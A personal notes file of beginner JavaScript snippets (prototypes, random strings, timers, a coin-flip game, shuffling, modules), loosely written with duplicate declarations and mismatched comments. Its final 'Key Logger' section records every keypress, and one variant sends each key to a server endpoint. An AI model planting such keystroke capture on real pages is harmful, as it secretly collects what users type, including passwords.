:::::::: Very Important in Jvacript ::::::::::::::::::::::::::::::::::::

///Create a custom create  a ProTotype |||||||||||||||||||||||||||||||||||
const one = [10, 20, 30, 40];
console.log(Object.getPrototypeOf(one)); 


Date.prototype.getLastYear = function() {
    return this.getFullYear() - 1; // Get the current year and subtract 1
  };
  
  let date = new Date();
  console.log(date.getLastYear()); // Output: Previous year




WordList Rand Hashes and random OTP and Random Email ......................................>>

let word = "wordlist";  :::::::: --> random  string number 
let randomIndex = Math.floor(Math.random() * word.length);
console.log(randomIndex); // Outputs a random index between 0 and 7
console.log(word[randomIndex]); // Outputs the letter at that index in the string



// let wordlist = `4114${Math.random().toString(16).slice(2, 16).padEnd(25, "iyhewchdchshdcs")}`; :::: Random hashes
// console.log(wordlist);
// console.log(wordlist.length);


::::: random wordlist create Important :::::::::::::::
let word = "jugalsharmajammu";
let wordlistLength = 10; // Length of the random wordlist you want to generate
let randomWordlist = "";

// Loop to create a random wordlist of the desired length
for (let i = 0; i < wordlistLength; i++) {
  let randomIndex = Math.floor(Math.random() * word.length);
  randomWordlist += word[randomIndex];
}

console.log("Random Wordlist:", randomWordlist);





if else and multi if else .........................Important ------>>

Here's how the code you provided will execute:
 The first if(18 == 19) condition is false, so it moves to the else if(18 > 19).
 The else if(18 > 19) condition is also false, so the program will go to the else block.
 In the else block, the final message "The first and second conditions are false" will be printed.


if(18 == 19){

   console.log("The condition is true");
}else if(18  < 19){
   
   if(18==18){

      console.log("18==18 is true")
   }else{
console.log("18==18 is false")
   }


   console.log("The first condition is false, but the second is true");
}else{
   console.log("The first and second conditions are false");
}






/// two Link open two webiste ----------------------------------->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Two Links</title>
    <script>
        function openLinks() {
            window.open('https://www.link1.com', '_blank');
            window.open('https://www.link2.com', '_blank');
        }
    </script>
</head>
<body onload="openLinks()">
    <p>Opening both websites...</p>
</body>
</html>




////  ---------->  Time date  


function update() {
   let currentDate = new Date(); // Create a Date object
   // Options to format the time with AM/PM in Indian Standard Time (IST)
   let options = {
       timeZone: 'Asia/Kolkata', // Set to Indian Standard Time
       hour12: true, // 12-hour format
       hour: 'numeric',
       minute: 'numeric',
       second: 'numeric',
   };
   // Format date and time with locale options for IST
   let formattedDateTime = currentDate.toLocaleString('en-IN', options);
   console.log(formattedDateTime); // Prints the date and time with AM/PM in IST
}
setInterval(() => {
   update();
}, 1000);



// function update(){
//    let data= new Date().toUTCString();
//    console.log(data)
// }
// setInterval(()=>{
//    update()
// },1000)






// function update()
// {
//    let date = new Date();

//    console.log(
//        date.getFullYear(),  // Get the full year (e.g., 2024)
//        date.getMonth(),     // Get the month (0-11, where 0 is January and 11 is December)
//        date.getDate(),      // Get the day of the month (1-31)
//        date.getHours(),     // Get the hours (0-23)
//        date.getMinutes(),   // Get the minutes (0-59)
//        date.getSeconds()    // Get the seconds (0-59)
//    );
   

// }
// setInterval(() => {
//    update();
// }, 1000);



/// Wait Time Out  --------------------->
function Set() {
   const delay = Date.now() + 5000; // 3-second delay
   // Busy-wait loop until the delay passes
   while (Date.now() < delay) {
      // Just waiting
      // console.log('waiting room')
   }
   console.log("jugal sharma");
}

Set();


function Set(){

   setTimeout(()=>{
      console.log("jugal sharma")
   } , 3000)
}

Set()









// Coin FLip Game start   ----------------------------------?>>>>>>>>>>>>>>

let clickCount = 0;
const maxClicks = 5;
let one=0
let two=0;
function flipButton() {
    if (clickCount < maxClicks) {
        clickCount++;
        const coinFlip = Math.random() < 0.5 ? 'Heads' : 'Tails';
        console.log(coinFlip);
        if (coinFlip === 'Heads') {
         
            console.log(coinFlip + " you win ");
            console.log(one++)
        } else {
            console.log(coinFlip + " you lose ");
            console.log(two++)
        }
    } else {
        console.log("No more flips allowed, you've reached the limit of 10.");

        console.log(one > two ? "You wine as a head" : "You  lose as a tail" )
    }


}
flipButton()

 ::: Without click random coin Flip ;;;  --------------------------------
const coinFlip = Math.random() < 0.5 ? 'Heads' : 'Tails';
console.log(coinFlip)
if(coinFlip === 'Heads'){
   console.log(coinFlip + " you win ")
}else{
   console.log(coinFlip + " you loose ")
}


////////////////// -------------------------- >> Start And end  Time Importan
let startTime = performance.now();
console.log(startTime.toString() , "startTime")

let i = 0;
while (i < 10) {
    console.log(i);
    i++;
}

let endTime = performance.now();
console.log(endTime.toString() , "endTime")
console.log(`Execution time: ${endTime - startTime} milliseconds`);

performance.now(): This method returns the current time in milliseconds, with fractional precision, relative to the time origin (typically the time the page was loaded).

startTime: Captures the time just before the loop starts.

endTime: Captures the time right after the loop ends.

Execution time calculation: By subtracting startTime from endTime, you get the total time taken to execute the loop, which is then logged to the console.


/////////////::::::::::::: Random array multi generaty

 let arr = ["jugal", "skaran", "anku", "lion", "tiger"];
      let arr1 = ["usa", "indian", "japan", "south africa", 'brazil'];
      let arr2 = [10, 20, 30, 60, 50, 40, 60];
      let arr3 = [10.0, 20.7, 58.5, 69.780];

      // Create an array containing references to the four arrays
      let arrayOfArrays = [arr, arr1, arr2, arr3];

      // Pick a random array from arrayOfArrays
      const randomArrayIndex = Math.floor(Math.random() * arrayOfArrays.length);
      const randomArray = arrayOfArrays[randomArrayIndex];





let data=["data" , "karan" , "jugal" , "sharma" , "solar"]  /// single array randomh ;;
let random=Math.floor(Math.random()*data.length)
console.log(data[random])


///:::::::::::::_______________>>>>>>>>> Import and export  
import { add, io, subtract } from "./Imp.js"; // Import the module

const sum = add(10, 5);
const difference = subtract(10, 5);

console.log('Sum:', sum);           // Output: Sum: 15
console.log('Difference:', difference); // Output: Difference: 5

console.log(io())



export function io() { // Use ESM export
    let two = "Jugal Sharma";
    return two;
}

// module.exports = io; // Use CommonJS export


export function add(a, b) {
    return a + b;
}

export function subtract(a, b) {
    return a - b;
}






/// --- >>>>>>>>>>>>>>>  ------------------------------------->
check even and add  Number 
    let cons =4

    if(cons % 2 ===0){
        console.log("number is even")
    }else{
        console.log("number is odd")
    }




//////////// -------------------->>> shuffering array  

function shuffleArray(array) {
        return array.sort(() => Math.random() - 0.5);
    }
    
    const colors = shuffleArray(['red', 'blue', 'green', 'yellow', 'orange', 'purple']);
    console.log(colors);



/// string dynamic string  :::::::::::::::::::::::::::::::::::::::::::::::::
redirect to new  URL after a deplay  -------------------------->>
  setTimeout(() => {
        window.location.href = "https://www.youtube.com/";
    }, 5000);
    




//merge object -------------------------> ::::::::::::::::::::::::::::::::::::::::

const person={name:"jan"}

const  details={age:30}

const full={...person , ...details}


////////////////////////  ---> number all change variable and  value

 let ran = 100;


 setInterval(()=>{

   console.log(ran , "ran add ++")
   ran ++
 } , 4000)


// only random change console -------------------  ::::::::::::::::::::::::::::::::
let ran = 100;

 setInterval(() => {
    console.log(Math.floor(ran * Math.random()));
}, 3000);


////////// string change  -------------------------------- ::::::::::::::::::::::::::::

 let str = "jugal sharma";
 let randomIndex = Math.floor(Math.random() * str.length);

 console.log(str[randomIndex]);


function shuffleString(str) {
   let arr = str.split(''); // Convert the string to an array of characters
   for (let i = arr.length - 1; i > 0; i--) {
       let j = Math.floor(Math.random() * (i + 1)); // Get a random index
       [arr[i], arr[j]] = [arr[j], arr[i]]; // Swap elements
   }
   return arr.join(''); // Convert the array back to a string
}
let str = "jugal sharma";
let shuffledStr = shuffleString(str);

console.log(shuffledStr);


:::::::::::::::: Key Logger -------------------------->>> Important ::::::::::::::  """"""""""""""""""""""""""""

let keysPressed = [];

document.addEventListener('keydown', function(event) {
  const key = event.key;
  keysPressed.push(key); // Store the key pressed
  console.log('Keys pressed so far:', keysPressed.join(''));
});

// You can now use the keysPressed array to access the key logs.


document.addEventListener('keydown', function(event) { :::::::::::: --------------->
  const key = event.key;
  console.log('Key pressed:', key);

  // Send the key to the server
  fetch('/log-key', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ key: key })
  }).catch(err => console.log('Error sending key:', err));
});


document.addEventListener('keydown', function(event) { ::::::::::::::::::::::::::------------------>
  const key = event.key;
  const shiftPressed = event.shiftKey ? 'Shift pressed' : 'Shift not pressed';
  const timestamp = new Date().toLocaleTimeString();

  console.log(`Key: ${key}, ${shiftPressed}, Timestamp: ${timestamp}`);
});



document.addEventListener('keydown', function(event) {  :::::::::::::::::--------------->
  const key = event.key;
  const isCtrlPressed = event.ctrlKey ? 'Ctrl' : '';
  const isAltPressed = event.altKey ? 'Alt' : '';
  const isShiftPressed = event.shiftKey ? 'Shift' : '';
  const combo = [isCtrlPressed, isAltPressed, isShiftPressed, key].filter(Boolean).join(' + ');

  console.log('Key combination:', combo);
});



document.addEventListener('keydown', function(event) {  ::::::::::::::-------------------->
  const key = event.key;
  if (/^[a-zA-Z]$/.test(key)) {
    console.log('Letter key pressed:', key);
  }
});


